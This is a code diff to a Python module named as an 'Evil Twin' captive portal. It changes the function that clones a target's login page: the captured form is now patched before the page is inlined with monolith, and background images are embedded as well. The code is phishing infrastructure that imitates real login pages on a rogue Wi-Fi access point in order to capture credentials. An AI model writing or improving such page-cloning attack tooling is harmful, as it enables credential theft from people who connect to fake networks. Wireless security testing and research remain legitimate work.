@@ -1,4 +1,4 @@
-"""
+﻿"""
 core/captive_portal.py
 ======================
 Módulo de Captive Portal (Evil Twin Público)
@@ -430,20 +430,18 @@ def clone_login_page(url, log_fn=None):
             if dump_result.returncode == 0 and len(dump_result.stdout) > 500:
                 _log("[*] Chromium dump-dom OK (" + str(len(dump_result.stdout)) + " bytes)")
 
-                # Estrategia: monolith procesa el HTML original para incrustar
-                # CSS/fuentes como data-URI. Pero monolith destruye <form>/<input>
-                # al re-serializar el DOM. Solución: extraemos los <style> y <link>
-                # incrustados que genera monolith y los inyectamos en el HTML
-                # original (que sí conserva el form intacto).
+                # Paso 1: adaptar el form en el DOM de chromium ANTES de monolith
+                patched_dom, form_found = _patch_form(dump_result.stdout, _log)
+
+                # Paso 2: monolith sin -I para incrustar imagenes de fondo tambien
                 mono_result = subprocess.run(
                     [
                         monolith_bin,
                         "-",
-                        "-I",
                         "-b", url,
                         "--insecure",
                     ],
-                    input=dump_result.stdout,
+                    input=patched_dom,
                     capture_output=True,
                     text=True,
                     timeout=120,
